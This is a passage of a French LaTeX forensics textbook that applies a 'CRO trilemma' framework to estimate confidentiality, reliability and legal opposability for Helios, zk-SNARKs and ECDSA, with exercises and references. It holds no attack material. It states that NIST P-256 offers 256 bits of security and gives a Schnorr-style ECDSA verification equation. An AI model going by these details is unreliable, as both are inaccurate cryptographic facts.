la confidentialité des clients \textbf{empêche précisément
l'investigation que la réglementation est censée permettre}.
L'article estime $\mathsf{Opp} \approx 0{,}67$ pour ce type de
système, meilleur qu'Helios, mais encore loin de l'optimum.

\subsection{ECDSA~: preuve juridique}

À l'opposé du spectre, les signatures numériques à courbes
elliptiques (ECDSA)~\cite{johnson2001ecdsa}, omniprésentes dans
les infrastructures à clé publique (Ch.~11~(UE~SEC4031),
eIDAS), atteignent une \textbf{acceptation judiciaire quasi
universelle}~: les tribunaux comprennent l'affirmation sémantique
``la partie A a autorisé le document D'' sans formation
cryptographique, via des décennies de jurisprudence et
d'infrastructure PKI établie.

\textbf{Lecture CRO}~: $\mathsf{Opp} \approx 0{,}90$, la plus
élevée des trois systèmes étudiés, mais au prix d'une
confidentialité quasi nulle~: la vérification exige de révéler
publiquement les messages signés et les relations entre clés,
incompatible avec des contextes exigeant confidentialité
(contrats sensibles, documents judiciaires scellés).

\subsection{Synthèse}

\begin{tableaucours}{p{3.0cm}p{2.2cm}p{2.2cm}p{2.2cm}p{2.8cm}}{%
    \tableauHeader{Système} &
    \tableauHeader{$\mathsf{Conf}$} &
    \tableauHeader{$\mathsf{Rel}$} &
    \tableauHeader{$\mathsf{Opp}$} &
    \tableauHeader{Tension dominante}
}
Helios (vote) & Élevé & Élevé & $\approx 0{,}50$ &
    Confidentialité/Fiabilité $\to$ Opposabilité \\
zk-SNARK (finance) & Quasi-parfait & Élevé & $\approx 0{,}67$ &
    Confidentialité $\to$ Opposabilité (audit ciblé impossible) \\
ECDSA (juridique) & Quasi-nul & Élevé & $\approx 0{,}90$ &
    Opposabilité $\to$ Confidentialité \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~27.3. Synthèse des trois études
de cas (d'après~\cite{minka2026clo})~: les produits
$\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp}$ observés s'échelonnent
de~$0{,}27$ à~$0{,}57$ selon le système, cohérent avec la borne du
Théorème~3}\end{center}

% ============================================================================
\section{Implications pour la Conception de Systèmes Forensiques}
\label{sec:implications-conception}
% ============================================================================

\subsection{Du calcul optimal à l'ingénierie sous contrainte}

L'implication méthodologique majeure des deux
articles~\cite{minka2026clo,minka2026conditional} est un
\textbf{changement de paradigme de conception}~: puisqu'aucun
protocole ne peut maximiser simultanément les trois dimensions
(Théorème~3), la question pertinente n'est plus ``quelle est la
primitive optimale~?'' mais ``\textbf{quel arbitrage spécifique
ce contexte institutionnel exige-t-il, et quelle architecture
satisfait ce besoin~?}''

\begin{boxCRO}
\textbf{Analyse CRO. L'architecture Gold-Iron-Clay
(\textit{Semantic One-Time Pad})}

L'article fondateur~\cite{minka2026clo} propose et prouve
optimale, au sein de sa classe de construction, une architecture
en trois couches~: \textbf{Gold} (confidentialité parfaite via
masque jetable), \textbf{Iron} (fiabilité via engagement
cryptographique liant), \textbf{Clay} (préservation contextuelle
pour l'opposabilité). Cette construction atteint
$\mathsf{Conf} \cdot \mathsf{Rel} \cdot \mathsf{Opp} =
H(C)/\lambda \cdot (1 - \mathrm{negl}(\lambda))$, l'optimum
exact permis par la borne du Théorème~2, démontrant qu'une
architecture multicouche peut effectivement \textbf{atteindre}
(et non simplement approcher) la limite théorique.

$\mathcal{R}$~: chaque couche apporte sa force dominante plutôt
que de chercher une primitive unique universelle, exactement
la logique de la chaîne de custody du Ch.~8~(UE~SEC4031)
(hash pour l'intégrité, signature pour l'authenticité, formulaire
papier pour la traçabilité).

$\mathcal{O}$~: la preuve d'optimalité, publiée et vérifiable,
confère à cette architecture une légitimité scientifique directement
opposable dans une discussion technique.

\cro{$\uparrow\uparrow$ couche Gold}{$\uparrow\uparrow$ couche Iron}{$\uparrow\uparrow$ couche Clay}
\end{boxCRO}

\subsection{Application à l'architecture forensique de ce cours}

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Dimension prioritaire} &
    \tableauHeader{Mécanisme apportant cette force} &
    \tableauHeader{Exemple dans ce cours}
}
$\mathsf{Rel}$ (Fiabilité) & Hash cryptographique
    (SHA-256/512) & Formulaire de custody
    (Ch.~8~(UE~SEC4031))~: hash calculé avant et après
    acquisition \\
$\mathsf{Opp}$ (Opposabilité) & Signature qualifiée +
    horodatage + formation du décideur & eIDAS
    (Ch.~11~(UE~SEC4031))~; investissement dans $H(C)$ via la
    formation des magistrats (Ch.~12~(UE~SEC4031)) \\
$\mathsf{Conf}$ (Confidentialité) & Chiffrement +
    minimisation de la collecte & Extraction ADB ciblée plutôt
    qu'exhaustive (Ch.~\ref{chap:for-mob})~; proportionnalité
    (\loicam{2024/017}~\cite{cameroun2024donnees}, art.~27) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~27.4. Architecture en couches
appliquée au cadre forensique de ce cours}\end{center}

Cette table révèle une cohérence remarquable~: la pratique
forensique enseignée tout au long de ce cours, chaîne de custody,
distinction constatation/analyse, principe de proportionnalité,
\textbf{constitue, sans que cela ait été formulé explicitement avant
ce chapitre, une instanciation pratique de l'architecture en couches
prouvée optimale par le cadre CLO}.

% ============================================================================
\section{Application Forensique Intégrative}
\label{sec:application-forensique}
% ============================================================================

\begin{boxscenario}{Relire l'affaire MVOM à travers le Trilemme CRO formalisé}
Reprenons l'Opération MVOM (Ch.~\ref{chap:for-sys},
\ref{chap:for-res}, \ref{chap:for-cloud}) à la lumière de ce
chapitre.

\textbf{Le hash \texttt{\$UsnJrnl}} (Ch.~\ref{chap:for-sys})~:
$\mathsf{Rel}$ proche de~1 (déterministe, vérifiable
indépendamment)~; $\mathsf{Conf}$ non pertinent (le hash ne protège
aucune confidentialité)~; $\mathsf{Opp}$ élevé \emph{si et seulement
si} le tribunal dispose de la formation technique pour interpréter
un horodatage de journal système, exactement la dépendance au
contexte $H(C)$ formalisée par le Théorème~2.

\textbf{Le chiffrement BitLocker du disque saisi}
(Ch.~6~(UE~SEC4031))~: $\mathsf{Conf}$ élevé pour le suspect avant
saisie~; après saisie légale et obtention de la clé, le système
bascule vers un régime où $\mathsf{Rel}$ et $\mathsf{Opp}$
deviennent les dimensions pertinentes pour l'analyse forensique,
illustrant que le positionnement CRO d'un mécanisme \textbf{dépend
du moment et du détenteur} de l'information, pas uniquement de
l'algorithme.

\textbf{La transaction Bitcoin tracée} (Ch.~\ref{chap:for-cloud})~:
$\mathsf{Conf}$ faible (registre public)~; $\mathsf{Rel}$ maximal
(immuabilité de la blockchain)~; $\mathsf{Opp}$ initialement faible
(pseudonymat) mais \textbf{augmentable} par l'apport de contexte
externe (identification KYC aux points d'échange), une
illustration directe du Théorème~2~: l'opposabilité croît avec
$H(C)$, ici obtenu par corrélation avec des sources tierces plutôt
que par la primitive cryptographique elle-même.
\end{boxscenario}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item Le \textbf{Trilemme CRO} est désormais un résultat
          \textbf{publié et évalué par les pairs}
          (IEEE Access,~2026, IF~$\approx 3{,}6$)~: les
          Théorèmes~1, 2 et~3 de ce chapitre correspondent à des
          théorèmes prouvés dans~\cite{minka2026clo}
          et~\cite{minka2026conditional}, pas à des conjectures.

    \item \textbf{Outils de théorie de l'information mobilisés}~:
          entropie de Shannon, information mutuelle, distance en
          variation totale, inégalités de Pinsker et de Fano, fondements classiques appliqués à un problème nouveau.

    \item \textbf{Définitions formelles}~: $\mathsf{Conf}$ (via TV
          distance), $\mathsf{Rel}$ (probabilité de vérification
          correcte), $\mathsf{Opp}$ (information mutuelle normalisée
          entre preuve et verdict), cette dernière étant
          l'innovation centrale du cadre.

    \item \textbf{Théorème principal}~: $\mathsf{Conf} \cdot
          \mathsf{Rel} \cdot \mathsf{Opp} \leq \Delta/\lambda +
          O(\lambda^{-2})$, où $\Delta$ quantifie la capacité
          d'extraction institutionnelle, enracinée dans les travaux
          de Miller sur la mémoire de travail humaine.

    \item \textbf{Trois études de cas documentées}~: Helios
          ($\mathsf{Opp}\approx 0{,}50$), zk-SNARKs
          ($\approx 0{,}67$), ECDSA ($\approx 0{,}90$),
          chacune occupant un point distinct, cohérent avec la
          théorie, sur la surface de compromis.

    \item \textbf{Réponse pratique~: architecture en couches}
          (Gold-Iron-Clay), prouvée optimale dans sa classe de
          construction, dont ce cours a montré qu'elle correspond
          structurellement à la pratique forensique enseignée
          depuis le Ch.~8~(UE~SEC4031).

    \item \textbf{Investir dans $H(C)$}, la formation des
          magistrats et des OPJ camerounais, élève le plafond
          d'opposabilité atteignable par \emph{tout} système de
          preuve, une implication directement actionnable pour
          la stratégie nationale évoquée au Ch.~\ref{chap:bench}.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~27.1. Maîtrise des outils de théorie de l'information \niveaubase}]
\begin{enumerate}[(a)]
    \item Calculez $H(X)$ pour une variable $X$ uniforme sur
          $4$~valeurs. Interprétez le résultat en bits.
    \item Si $I(X;Y) = H(X)$, que peut-on en conclure sur la
          relation entre $X$ et $Y$~?
    \item Expliquez, en une phrase, pourquoi l'inégalité de
          Pinsker~\eqref{eq:pinsker} permet de relier une exigence
          de fiabilité à une borne sur la confidentialité.
    \item Pour chacun des trois mécanismes suivants rencontrés
          dans ce cours, identifiez la dimension CRO structurellement
          privilégiée et celle structurellement sacrifiée, en
          justifiant par un argument technique~: le chiffrement
          BitLocker (Ch.~6~(UE~SEC4031))~; une signature ECDSA
          (Ch.~11~(UE~SEC4031))~; une preuve à divulgation
          nulle de connaissance.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~27.2. Lecture critique du Théorème~3 \niveaumoyen}]
\begin{enumerate}[(a)]
    \item Le Théorème~3 s'applique sous l'hypothèse
          $\lambda \geq 64$. Pourquoi cette condition est-elle
          nécessaire (référez-vous au rôle du terme
          $O(\lambda^{-2})$)~?
    \item Le Tableau~27.2 estime $H(C) \approx 8$~bits pour un
          tribunal de juridiction générale. En utilisant le
          Théorème~2, et pour $\lambda = 128$, estimez l'opposabilité
          maximale théoriquement atteignable dans ce contexte si
          $H(V|C) \approx H(C)$. Commentez l'écart avec
          l'opposabilité ECDSA observée empiriquement
          ($\approx 0{,}90$), que cela révèle-t-il sur les
          conditions d'application du théorème~?
    \item Le chapitre mentionne que la forme additive de $\Delta$
          (plutôt que multiplicative ou sous-linéaire) a été
          choisie et justifiée par les auteurs. Pourquoi une
          borne sous-linéaire serait-elle ``trop pessimiste'',
          selon les termes de l'article~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~27.3. Application intégrative à une affaire du cours \niveauexpert}]
Reprenez l'affaire DIBAMBA (Ch.~\ref{chap:cas-int})~: fraude MoMo
avec SIM~swap, communications chiffrées, et adresse Bitcoin tracée.
\begin{enumerate}[(a)]
    \item Pour chacun des trois éléments probatoires de cette
          affaire (logs MTN, communications chiffrées, transactions
          blockchain), estimez qualitativement (Faible/Modéré/Élevé,
          en justifiant) les trois mesures $\mathsf{Conf}$,
          $\mathsf{Rel}$, $\mathsf{Opp}$, en vous appuyant sur les
          définitions formelles de la Section~\ref{sec:cadre-clo}.
    \item En vous inspirant de l'architecture Gold-Iron-Clay
          (Section~\ref{sec:implications-conception}), construisez
          une architecture en couches pour cette affaire~: quel
          mécanisme apporte la force $\mathsf{Rel}$~? Lequel apporte
          $\mathsf{Opp}$~? Lequel gère $\mathsf{Conf}$~?
    \item Le Théorème~2 implique que l'opposabilité de cette
          affaire est plafonnée par $H(C)$ du tribunal saisi.
          Proposez deux actions concrètes, dans l'esprit du
          Tableau~27.1 (documentation, collaboration, spécialisation),
          qui augmenteraient $H(C)$ pour ce dossier spécifique.
    \item Rédigez un paragraphe de synthèse expliquant en quoi
          cet exercice illustre que le Trilemme CRO formalisé
          dans ce chapitre n'est pas une abstraction mathématique
          déconnectée, mais la \textbf{systématisation rigoureuse},
          désormais publiée et vérifiable, d'un raisonnement que
          vous avez pratiqué tout au long de ce cours.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Sur la place de ce chapitre dans le cours.} Ce chapitre
referme la boucle conceptuelle ouverte au tout premier chapitre
du cours~: le Trilemme CRO, présenté ici dans sa forme prouvée et
publiée, est l'outil que vous avez appliqué intuitivement à chaque
décision investigative rencontrée, du choix d'éteindre ou non
un PC suspect (Ch.~8~(UE~SEC4031)) à la stratégie de coopération
internationale (Ch.~10~(UE~SEC4031)), en passant par la
conception d'une architecture de \textit{readiness} cloud-native
(Ch.~\ref{chap:containers}).

\textit{Que vous reteniez une seule chose de ce chapitre, que ce
soit celle-ci~: tout système, toute décision, toute primitive
implique un arbitrage entre confidentialité, fiabilité et
opposabilité, et ce n'est plus une intuition pédagogique mais
un théorème mathématique prouvé, publié et évalué par les pairs.
La compétence de l'investigateur ne consiste pas à éliminer cet
arbitrage, c'est désormais mathématiquement établi comme
structurellement impossible. Elle consiste à le rendre
\textbf{explicite, justifié et documenté}, et, quand l'institution
le permet, à investir dans $H(C)$ pour repousser la limite elle-même.}
\end{boxinfo}

% ============================================================================
% Références bibliographiques propres à ce chapitre
% (à intégrer dans D_bibliographie.tex)
% ============================================================================
% @article{minka2026clo,
%   author  = {Minka Mi Nguidjoï, Thierry Emmanuel and Mani Onana,
%              Flavien Serge and Djotio Ndjé, Thomas},
%   title   = {Cryptographic Legal Opposability (CLO) Framework:
%              Confidentiality-Reliability-Opposability Trade-Offs
%              in Institutional Cryptography},
%   journal = {IEEE Access},
%   volume  = {14},
%   pages   = {20427--20445},
%   year    = {2026},
%   doi     = {10.1109/ACCESS.2026.3660105}
% }
% @article{minka2026conditional,
%   author  = {Minka Mi Nguidjoï, Thierry Emmanuel and Mani Onana,
%              Flavien Serge and Djotio Ndjé, Thomas},
%   title   = {The Conditional CRO Trilemma: Impossibility Bounds
%              on Confidentiality, Reliability, and Opposability
%              Under Institutional Extraction Limits},
%   journal = {IEEE Access},
%   volume  = {14},
%   pages   = {33263--33274},
%   year    = {2026},
%   doi     = {10.1109/ACCESS.2026.3669065}
% }
% @article{shannon1948,
%   author  = {Shannon, Claude E.},
%   title   = {A Mathematical Theory of Communication},
%   journal = {Bell System Technical Journal},
%   volume  = {27}, number = {3}, pages = {379--423}, year = {1948}
% }
% @article{miller1956,
%   author  = {Miller, George A.},
%   title   = {The Magical Number Seven, Plus or Minus Two},
%   journal = {Psychological Review}, volume = {63}, pages = {81--97},
%   year    = {1956}
% }
% @inproceedings{adida2009helios,
%   author = {Adida, Ben}, title = {Helios: Web-based open-audit voting},
%   booktitle = {Proc. 17th USENIX Security Symp.}, pages = {335--348},
%   year = {2009}
% }
% @inproceedings{adida2009university,
%   author = {Adida, Ben and de Marneffe, Olivier and Pereira, Olivier
%             and Quisquater, Jean-Jacques},
%   title  = {Electing a university president using open-audit voting:
%             Analysis of real-world use of Helios},
%   booktitle = {Proc. EVT/WOTE}, year = {2009}
% }
% @misc{iacr2025,
%   author = {{International Association for Cryptologic Research}},
%   title  = {2025 IACR Election Update}, year = {2025},
%   note   = {Online; iacr.org/news/item/27138}
% }
% @article{johnson2001ecdsa,
%   author  = {Johnson, Don and Menezes, Alfred and Vanstone, Scott},
%   title   = {The Elliptic Curve Digital Signature Algorithm (ECDSA)},
%   journal = {Int. J. Inf. Secur.}, volume = {1}, number = {1},
%   pages   = {36--63}, year = {2001}
% }
    
        % ============================================================================
% Fichier  : partie6/P06_C28_analyse_primitives.tex
% Titre    : Analyse des Primitives Cryptographiques selon le Cadre CLO
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 2.0 -- Juin 2026 
% ============================================================================

\chapter{Analyse des Primitives Cryptographiques selon le Cadre CLO}
\label{chap:prim-crypt}

\epigraph{%
    « Cryptographic primitives are the building blocks of trust in
    digital systems. Each must be evaluated against its resilience to
    emerging threats. »%
}{Adi Shamir}

\niveauChapitre{Recherche}{%
    Chapitre~\ref{chap:CRO} (formalisation du Trilemme CRO)
    indispensable~: ce chapitre applique méthodiquement les outils
    qui y sont définis. Notions de cryptographie avancée recommandées.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Reproduire, étape par étape, la méthodologie de calcul du
          cadre CLO sur les trois protocoles effectivement analysés
          dans la littérature publiée~: Helios, zk-SNARKs, ECDSA.
    \item Comprendre les trois méthodes d'estimation de l'entropie
          contextuelle $H(C)$~: bornes structurelles, littérature
          d'expertise, modélisation information-théorique.
    \item Décomposer le calcul de $I(V;\Sigma\mid C)$ dimension par
          dimension pour un protocole donné.
    \item Situer chaque primitive dans son \textbf{régime de capacité
          institutionnelle} (faible/moyen/élevé) et en déduire des
          recommandations de conception.
    \item Distinguer rigoureusement ce qui est \textbf{publié et
          calculé} de ce qui reste, en l'état de la recherche,
          \textbf{une question ouverte} pour d'autres primitives.
    \item Appliquer cette méthodologie à une primitive non encore
          analysée dans la littérature, comme exercice de recherche.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{De la théorie générale à l'analyse de cas reproductible}
% ============================================================================

Le Chapitre~\ref{chap:CRO} a établi le cadre théorique~: définitions
formelles, théorèmes de bornes, démonstration du Trilemme conditionnel.
Ce chapitre descend d'un niveau d'abstraction~: il \textbf{reproduit
intégralement} la méthodologie de calcul appliquée par les auteurs
à trois protocoles réels, avec une transparence totale sur chaque
étape, l'objectif pédagogique étant de vous rendre capable de
mener vous-même ce type d'analyse sur une primitive de votre choix.

\begin{boxalert}
\textbf{Avertissement méthodologique, conforme à celui des auteurs}

Les calculs présentés dans ce chapitre sont qualifiés, dans
l'article source~\cite{minka2026clo}, d'\textbf{estimations
théoriques} (\textit{theoretical estimates}), pas de mesures
empiriques. La note méthodologique de l'article le précise
explicitement~: \textit{``ces estimations démontrent une capacité
analytique et identifient des motifs de compromis~; la validation
empirique auprès de décideurs institutionnels reste un travail
futur''}. Ce chapitre conserve scrupuleusement cette honnêteté
méthodologique, exactement la posture de la distinction
constatation/analyse pratiquée depuis le Ch.~\ref{chap:rapport}
de ce cours.
\end{boxalert}

\separateur

% ============================================================================
\section{Méthodologie de Calcul~: les Quatre Étapes}
\label{sec:methodologie}
% ============================================================================

Pour chaque protocole analysé, la méthodologie publiée
dans~\cite{minka2026clo} procède en quatre étapes systématiques.

\begin{tableaucours}{p{2.5cm}p{8.5cm}}{%
    \tableauHeader{Étape} &
    \tableauHeader{Contenu}
}
\textbf{1. Formalisation} & Définir $\mathcal{M}, \Sigma, \mathcal{C},
    \mathcal{V}$ à partir des spécifications publiées du protocole. \\
\textbf{2. Estimation de $H(C)$} & Estimer l'entropie contextuelle par
    triangulation de trois méthodes complémentaires
    (Section~\ref{sec:trois-methodes}). \\
\textbf{3. Calcul ou bornage de $\mathsf{Conf}$, $\mathsf{Rel}$,
    $\mathsf{Opp}$} & Dériver les trois mesures à partir des propriétés
    cryptographiques publiées et de l'estimation de $H(C)$. \\
\textbf{4. Implications institutionnelles} & Interpréter le produit
    $\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp}$ et le situer
    dans un régime de capacité (Section~\ref{sec:regimes}). \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~28.1. Les quatre étapes de la
méthodologie CLO}\end{center}

\subsection{Les trois méthodes d'estimation de $H(C)$}
\label{sec:trois-methodes}

\begin{boxdef}
\textbf{Méthode~1. Bornes structurelles}~: compter les
caractéristiques contextuelles distinguables à partir des textes
légaux et réglementaires. \textit{Exemple~:} une juridiction
générale distingue $\approx 16$~types de preuves et $\approx 16$
contextes procéduraux, donnant
$H(C) \geq \log_2(16 \times 16) = 8$~bits.

\textbf{Méthode~2. Littérature d'expertise}~: s'appuyer sur les
résultats des sciences cognitives concernant la capacité de mémoire
de travail à long terme des experts (typiquement
$2^{12}$--$2^{15}$~``chunks'', cf.~Ericsson, cité
dans~\cite{minka2026clo}), suggérant une entropie contextuelle
d'expert de l'ordre de~$12$ à~$15$~bits.

\textbf{Méthode~3. Modélisation information-théorique}~: modéliser
la prise de décision institutionnelle comme une application
probabiliste de l'evidence vers les verdicts, et estimer les bornes
d'information mutuelle correspondantes.
\end{boxdef}

Ces trois méthodes convergent, selon~\cite{minka2026clo}, vers les
plages suivantes~: tribunaux généraux $H(C) \approx 8$--$16$~bits~;
régulateurs spécialisés $\approx 10$--$32$~bits~; experts de
domaine $\approx 20$--$64$~bits.

% ============================================================================
\section{Étude de Cas~1~: Helios. Vote Électronique}
\label{sec:cas-helios}
% ============================================================================

\subsection{Formalisation du protocole}

Helios~\cite{adida2009helios} utilise le chiffrement ElGamal et des
preuves à divulgation nulle de connaissance Fiat-Shamir sur des
groupes de logarithme discret~$2048$~bits.

\begin{itemize}
    \item \textbf{Messages}~: votes individuels $v \in \{1,\ldots,K\}$~;
    \item \textbf{Preuves}~: $\sigma = (\mathrm{Enc}(v), \pi_{\mathrm{valid}},
          \pi_{\mathrm{tally}})$, où $\mathrm{Enc}$ est le
          chiffrement ElGamal et $\pi$ les preuves Fiat-Shamir~;
    \item \textbf{Contexte}~: litige électoral devant un tribunal de
          juridiction générale, $H(C) \approx 8$~bits (Méthode~1~:
          $\approx 16$~types de preuves distinguables, $\approx
          16$~contextes procéduraux)~;
    \item \textbf{Verdicts}~: $\mathcal{V} = \{$élection valide,
          élection invalide, recomptage, demande d'investigation$\}$,
          soit $H(V \mid C) = 2$~bits.
\end{itemize}

\subsection{Calcul détaillé, étape par étape}

\begin{boxoutils}{Helios, calcul publié, reproduit intégralement}
\textbf{Confidentialité}. sécurité sémantique ElGamal sous
l'hypothèse DDH (\textit{Decisional Diffie-Hellman})~:
\[
\mathsf{Conf}(\text{Helios}) \approx 0{,}92
\]

\textbf{Fiabilité}. solidité des preuves à divulgation nulle,
erreur $< 2^{-80}$~:
\[
\mathsf{Rel}(\text{Helios}) \approx 0{,}95
\]

\textbf{Opposabilité}. décomposition explicite~:
les tribunaux peuvent extraire un \textbf{signal d'expert binaire}
depuis les preuves cryptographiques~: ``valide'' ou ``invalide''.
Cela représente
\[
I(V;\Sigma\mid C) \approx 1~\text{bit}
\]
sur les $H(V\mid C) = 2$~bits d'incertitude totale du verdict. D'où~:
\[
\mathsf{Opp}(\text{Helios}, C_{\text{tribunal}}) =
\frac{I(V;\Sigma\mid C)}{H(V\mid C)} \approx \frac{1}{2} = 0{,}50
\]

\textbf{Produit}~:
\[
\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp} \approx
0{,}92 \times 0{,}95 \times 0{,}50 \approx \mathbf{0{,}437}
\]
\end{boxoutils}

\textbf{Interprétation publiée}~: cette opposabilité de~$50\%$
signifie que les preuves cryptographiques résolvent la \emph{moitié}
de l'incertitude institutionnelle~; l'autre moitié requiert un
raisonnement juridique sur la conformité procédurale, l'intention
de l'électeur et le droit électoral spécifique à la
juridiction, des dimensions \textbf{inaccessibles à la seule
vérification cryptographique}.

% ============================================================================
\section{Étude de Cas~2~: zk-SNARKs. Conformité Financière}
\label{sec:cas-zksnark}
% ============================================================================

\subsection{Formalisation du protocole}

Référence~\cite{groth2016zksnark}~: preuves à divulgation nulle
succinctes (construction Groth16 sur courbe BN254) permettant à une
institution financière de prouver ``toutes les transactions
respectent les règles de conformité'' via une preuve de~200~octets,
sans révéler le détail des transactions.

\begin{itemize}
    \item \textbf{Contexte}~: audit réglementaire par une autorité
          financière, $H(C) \approx 11$~bits (expertise réglementaire~:
          $\approx 64$~catégories de preuves à travers
          $\approx 32$~cadres procéduraux,
          $\log_2(64\times 32) \approx 11$)~;
    \item \textbf{Verdicts}~: $\mathcal{V} = \{$conforme, non conforme,
          investigation requise, sanction, action corrective,
          escalade, approbation conditionnelle, audit forensique
          complet$\}$, soit $H(V\mid C) = \log_2(8) = 3$~bits.
\end{itemize}

\subsection{Calcul détaillé, étape par étape}

\begin{boxoutils}{zk-SNARK. calcul publié, reproduit intégralement}
\textbf{Confidentialité}. divulgation nulle calculatoire sous
hypothèses d'accouplement (\textit{pairing})~:
\[
\mathsf{Conf}(\text{zk-SNARK}) \approx 0{,}89
\]

\textbf{Fiabilité}. solidité de connaissance, en tenant compte
du \textit{trusted setup}~:
\[
\mathsf{Rel}(\text{zk-SNARK}) \approx 0{,}96
\]

\textbf{Opposabilité}. décomposition explicite en \textbf{deux}
bits d'information extractible~:
\begin{enumerate}
    \item \textit{Vérification calculatoire} ($1$~bit)~: la preuve
          vérifie ou non sous les contraintes d'accouplement~;
    \item \textit{Catégorisation de conformité} ($1$~bit)~:
          classification approximative visible dans la structure
          de la preuve (``passe toutes les contraintes'' vs.
          ``proche de la limite'' vs.\ ``signal de violation clair'').
\end{enumerate}
\[
I(V;\Sigma\mid C) \approx 2~\text{bits}, \qquad
\mathsf{Opp}(\text{zk-SNARK}, C_{\text{régulateur}}) =
\frac{2}{3} \approx 0{,}67
\]

\textbf{Produit}~:
\[
\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp} \approx
0{,}89 \times 0{,}96 \times 0{,}67 \approx \mathbf{0{,}572}
\]
\end{boxoutils}

\textbf{Interprétation publiée}~: l'opposabilité supérieure à celle
d'Helios ($67\%$ contre~$50\%$) reflète un \textbf{contexte
institutionnel plus riche} ($H(C)=11$~bits contre~$8$)~: les
preuves cryptographiques résolvent les deux tiers de l'incertitude
réglementaire. Mais le tiers restant, jugement réglementaire sur
la matérialité, évaluation du risque systémique, priorisation des
mesures d'exécution, demeure structurellement
\textbf{inaccessible}, ce qui constitue exactement la limite
documentée au Ch.~\ref{chap:for-cloud} de ce cours~: l'opacité
cryptographique qui protège la confidentialité des clients
empêche l'audit ciblé lorsqu'un schéma suspect émerge.

% ============================================================================
\section{Étude de Cas~3~: ECDSA. Signature Juridique}
\label{sec:cas-ecdsa}
% ============================================================================

\subsection{Formalisation du protocole}

Référence~\cite{johnson2001ecdsa}~: authentification standard via
ECDSA sur la courbe NIST~P-256 ($256$~bits de sécurité),
équation de vérification $sG = R + eP_{\mathrm{pub}}$.

\begin{itemize}
    \item \textbf{Contexte}~: litige contractuel civil avec
          infrastructure PKI établie, $H(C) \approx 20$~bits, décomposé
          en~:
          compréhension de l'infrastructure PKI
          ($\approx 2^{10}=1024$~types de certificats~: $10$~bits)~;
          précédents jurisprudentiels
          ($\approx 2^8=256$~catégories de précédents~: $8$~bits)~;
          cadres statutaires (ESIGN Act, eIDAS, réglementations
          étatiques~: $\approx 2^2=4$~cadres~: $2$~bits)~;
    \item \textbf{Verdicts}~: espace de décision riche couvrant
          validité, force d'authentification, poids juridique,
          recevabilité procédurale, validité temporelle, confirmation
          d'autorité, pertinence contextuelle, $H(V\mid C)
          \approx 20$~bits.
\end{itemize}

\subsection{Calcul détaillé, étape par étape}

\begin{boxoutils}{ECDSA, calcul publié, reproduit intégralement}
\textbf{Confidentialité}. les messages signés sont publics~;
seules les clés privées restent cachées~:
\[
\mathsf{Conf}(\text{ECDSA}) \approx 0{,}31
\]

\textbf{Fiabilité}. vérification déterministe, la falsification
exige de résoudre le problème du logarithme discret elliptique~:
\[
\mathsf{Rel}(\text{ECDSA}) \approx 0{,}98
\]

\textbf{Opposabilité}. décomposition en \textbf{cinq} dimensions
d'information extractible (contrairement aux zk-SNARKs qui
minimisent intentionnellement la divulgation, ECDSA permet aux
tribunaux d'évaluer indépendamment plusieurs dimensions
institutionnelles via les cadres juridiques et techniques établis)~:

\begin{tableaucours}{p{4.0cm}p{1.5cm}p{5.0cm}}{%
    \tableauHeader{Dimension extraite} &
    \tableauHeader{Bits} &
    \tableauHeader{Contenu}
}
Vérification de propriété de
    clé publique & 3 & Chaîne de certificats, confiance émetteur,
    restrictions d'usage \\
Liaison message-signature & 4 & Intégrité du hash, conformité
    de format, non-répudiation \\
Validité temporelle & 3 & Horodatage, période de validité du
    certificat, statut de révocation (CRL/OCSP) \\
Évaluation d'autorité légale & 3 & Vérification du signataire,
    formation du contrat, conformité juridictionnelle \\
Pertinence contextuelle & 5 & Type de transaction, conformité
    réglementaire, profil de risque \\
\textbf{Total} & \textbf{18} & \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~28.2. Décomposition de
$I(V;\Sigma\mid C)$ pour ECDSA (5~dimensions, total~18~bits)}\end{center}

\[
I(V;\Sigma\mid C) \approx 18~\text{bits}, \qquad
\mathsf{Opp}(\text{ECDSA}, C_{\text{tribunal civil}}) =
\frac{18}{20} \approx 0{,}90
\]

\textbf{Produit}~:
\[
\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp} \approx
0{,}31 \times 0{,}98 \times 0{,}90 \approx \mathbf{0{,}273}
\]
\end{boxoutils}

\textbf{Interprétation publiée}~: ECDSA atteint la plus haute
opposabilité des trois protocoles ($90\%$) précisément
\textbf{parce qu'il sacrifie la confidentialité par construction}~:
sa transparence permet aux tribunaux d'évaluer indépendamment
plusieurs dimensions à travers des cadres juridiques et techniques
établis de longue date (ESIGN Act, eIDAS, Ch.~11~(UE~SEC4031)
de ce cours). C'est, des trois protocoles, celui dont le produit
$\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp}$ est le \textbf{plus
faible} ($0{,}273$), illustrant que l'opposabilité maximale ne
garantit pas le meilleur compromis global, exactement la tension
documentée au Ch.~\ref{chap:CRO}.

% ============================================================================
\section{Tableau de Synthèse Publié}
\label{sec:tableau-synthese}
% ============================================================================

\begin{tableaucours}{p{3.0cm}p{1.6cm}p{1.6cm}p{1.6cm}p{2.4cm}}{%
    \tableauHeader{Système} &
    \tableauHeader{$\mathsf{Conf}$} &
    \tableauHeader{$\mathsf{Rel}$} &
    \tableauHeader{$\mathsf{Opp}$} &
